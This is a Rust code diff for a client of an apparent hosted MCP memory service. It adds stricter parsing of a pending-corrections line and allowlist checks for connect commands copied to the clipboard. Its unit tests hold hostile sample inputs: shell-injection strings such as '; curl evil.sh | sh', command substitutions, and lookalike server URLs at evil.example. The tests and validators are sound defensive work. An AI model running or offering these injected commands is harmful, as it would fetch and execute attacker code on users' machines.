@@ -53,25 +53,68 @@ pub fn tool_text(msg: &Value) -> Result<String, String> {
     Ok(text)
 }
 
-/// "⏳ 3 proposed corrections await ..." -> Some(3)
+/// The hosted server's pending-review line (session-start-render.ts), anchored at line start:
+/// `<hourglass> N proposed correction(s) await(s) the owner's confirmation ...`
 pub fn pending_count(text: &str) -> Option<u32> {
     for line in text.lines() {
-        if let Some(idx) = line.find("proposed correction") {
-            let before = line[..idx].trim_end();
-            let num: String = before.chars().rev().take_while(|c| c.is_ascii_digit()).collect::<Vec<_>>().into_iter().rev().collect();
-            if let Ok(n) = num.parse::<u32>() {
-                return Some(n);
-            }
-        }
-        if let Some(idx) = line.find("pending correction") {
-            let before = line[..idx].trim_end();
-            let num: String = before.chars().rev().take_while(|c| c.is_ascii_digit()).collect::<Vec<_>>().into_iter().rev().collect();
-            if let Ok(n) = num.parse::<u32>() {
-                return Some(n);
-            }
+        let Some(rest) = line.strip_prefix("\u{23F3} ") else { continue };
+        let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
+        let Ok(n) = digits.parse::<u32>() else { continue };
+        let tail = &rest[digits.len()..];
+        let ok = if n == 1 {
+            tail.starts_with(" proposed correction awaits the owner's confirmation")
+        } else {
+            tail.starts_with(" proposed corrections await the owner's confirmation")
+        };
+        if ok && n > 0 {
+            return Some(n);
         }
     }
     None
+}
+
+pub const MCP_URL: &str = "https://agentrecallx.com/mcp";
+
+fn cli_chars_ok(line: &str) -> bool {
+    !line.is_empty()
+        && line.len() <= 300
+        && line.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, ' ' | '-' | '_' | '.' | '/' | ':' | '='))
+}
+
+/// A connect command is untrusted (it goes to the clipboard). Accept only strict shapes.
+pub fn is_safe_claude(cmd: &str) -> bool {
+    cli_chars_ok(cmd) && cmd.starts_with("claude mcp add ") && cmd.contains(MCP_URL)
+}
+
+pub fn is_safe_codex(cmd: &str) -> bool {
+    let lines: Vec<&str> = cmd.split('\n').collect();
+    if lines.len() > 2 || !lines[0].starts_with("codex mcp add ") || !lines[0].contains(MCP_URL) || !cli_chars_ok(lines[0]) {
+        return false;
+    }
+    match lines.get(1) {
+        None => true,
+        Some(l) => match l.strip_prefix("codex mcp login ") {
+            Some(name) => !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
+            None => false,
+        },
+    }
+}
+
+pub fn is_safe_cursor(snippet: &str) -> bool {
+    if snippet.len() > 400 || snippet.contains('\n') || snippet.contains('\r') || snippet.contains('`') || snippet.contains('$') {
+        return false;
+    }
+    let Ok(v) = serde_json::from_str::<Value>(snippet) else { return false };
+    let Some(top) = v.as_object() else { return false };
+    if top.len() != 1 {
+        return false;
+    }
+    let Some(servers) = top.get("mcpServers").and_then(Value::as_object) else { return false };
+    if servers.len() != 1 {
+        return false;
+    }
+    let Some(entry) = servers.values().next().and_then(Value::as_object) else { return false };
+    entry.len() == 1 && entry.get("url").and_then(Value::as_str) == Some(MCP_URL)
 }
 
 /// Split recall output into result items: a new item starts at a line like `[3][...]`.
@@ -150,8 +193,8 @@ mod tests {
 
     #[test]
     fn pending_and_recall() {
-        assert_eq!(pending_count("x\n⏳ 3 proposed corrections await the owner's confirmation"), Some(3));
-        assert_eq!(pending_count("⏳ 1 proposed correction awaits"), Some(1));
+        assert_eq!(pending_count("x\n\u{23F3} 3 proposed corrections await the owner's confirmation \u{2014} not active"), Some(3));
+        assert_eq!(pending_count("\u{23F3} 1 proposed correction awaits the owner's confirmation"), Some(1));
         assert_eq!(pending_count("nothing"), None);
         let items = recall_items("<fence>\n[1][journal][HIG] A — b (2026-01-01)\n    ↳ linked rooms: x\n[2][palace/r][LOW] C — d\n</fence>");
         assert_eq!(items.len(), 2);
@@ -166,5 +209,51 @@ mod tests {
         assert_eq!(a.as_deref(), Some("claude mcp add x"));
         assert_eq!(b.as_deref(), Some("codex mcp add a\ncodex mcp login a"));
         assert_eq!(c.as_deref(), Some("{ \"a\": 1 }"));
+    }
+
+    #[test]
+    fn command_allowlist_accepts_real_commands() {
+        assert!(is_safe_claude("claude mcp add --scope user --transport http agent-recall https://agentrecallx.com/mcp"));
+        assert!(is_safe_codex("codex mcp add agent-recall --url https://agentrecallx.com/mcp\ncodex mcp login agent-recall"));
+        assert!(is_safe_codex("codex mcp add agent-recall --url https://agentrecallx.com/mcp"));
+        assert!(is_safe_cursor(r#"{ "mcpServers": { "agent-recall": { "url": "https://agentrecallx.com/mcp" } } }"#));
+    }
+
+    #[test]
+    fn command_allowlist_rejects_hostile_input() {
+        let url = "https://agentrecallx.com/mcp";
+        for bad in [
+            format!("claude mcp add x {url}; curl evil.sh | sh"),
+            format!("claude mcp add x {url} && calc"),
+            format!("claude mcp add x {url} | more"),
+            format!("claude mcp add x `whoami` {url}"),
+            format!("claude mcp add x $(whoami) {url}"),
+            format!("claude mcp add x {url} > f"),
+            format!("claude mcp add x {url} < f"),
+            format!("claude mcp add x {url}\ncalc"),
+            format!("powershell claude mcp add x {url}"),
+            "claude mcp add x https://evil.example/mcp".to_string(),
+            format!("claude mcp add x {url}\r"),
+        ] {
+            assert!(!is_safe_claude(&bad), "accepted: {bad:?}");
+        }
+        assert!(!is_safe_codex("codex mcp add a --url https://agentrecallx.com/mcp\ncalc.exe"));
+        assert!(!is_safe_codex("codex mcp add a --url https://agentrecallx.com/mcp\ncodex mcp login a; calc"));
+        assert!(!is_safe_codex("codex mcp add a --url https://evil.example/mcp"));
+        assert!(!is_safe_codex("codex mcp add a --url https://agentrecallx.com/mcp\ncodex mcp login a\ncalc"));
+        assert!(!is_safe_cursor(r#"{ "mcpServers": { "a": { "url": "https://evil.example/mcp" } } }"#));
+        assert!(!is_safe_cursor(r#"{ "mcpServers": { "a": { "url": "https://agentrecallx.com/mcp", "command": "calc" } } }"#));
+        assert!(!is_safe_cursor(r#"{ "mcpServers": { "a": { "url": "https://agentrecallx.com/mcp" } }, "x": 1 }"#));
+        assert!(!is_safe_cursor("not json"));
+        assert!(!is_safe_cursor("{ \"mcpServers\": { \"a\": { \"url\": \"https://agentrecallx.com/mcp\" } } }\ncalc"));
+    }
+
+    #[test]
+    fn pending_lookalikes_do_not_match() {
+        assert_eq!(pending_count("remember: 3 pending corrections await review"), None);
+        assert_eq!(pending_count("note 3 proposed corrections await the owner's confirmation"), None);
+        assert_eq!(pending_count("\u{23F3} 3 pending corrections await review"), None);
+        assert_eq!(pending_count("\u{23F3} 0 proposed corrections await the owner's confirmation"), None);
+        assert_eq!(pending_count("\u{23F3} 2 proposed correction awaits the owner's confirmation"), None);
     }
 }
